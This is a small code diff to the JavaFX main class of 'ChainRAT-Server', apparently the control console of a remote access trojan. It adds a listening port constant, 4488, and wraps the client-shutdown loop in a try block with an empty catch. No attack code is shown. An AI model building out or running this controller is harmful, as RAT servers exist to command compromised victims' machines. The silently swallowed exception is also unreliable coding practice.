@@ -11,6 +11,7 @@ import javafx.stage.Stage;
 
 public class Main extends Application {
     private static frmMainController mainController;
+    private static final int PORT = 4488;
     private static Log log;
 
     @Override
@@ -19,11 +20,14 @@ public class Main extends Application {
         Parent root = loader.load();
         mainController = loader.getController();
         primaryStage.setOnCloseRequest( event -> {
-            for(Integer i : Server.clientMap.keySet()){
-                Server.ClientHandler handler = Server.clientMap.get(i);
-                handler.close();
-            }
-            System.exit(0);
+            try {
+                for(Integer i : Server.clientMap.keySet()){
+                    Server.ClientHandler handler = Server.clientMap.get(i);
+                    handler.close();
+                }
+                System.exit(0);
+            }catch (Exception ex){}
+
         } );
         primaryStage.setTitle("ChainRAT-Server");
         primaryStage.setScene(new Scene(root, 800, 400));
@@ -43,5 +47,9 @@ public class Main extends Application {
 
     public static Log getLog(){
         return log;
+    }
+
+    public static int getPort(){
+        return PORT;
     }
 }
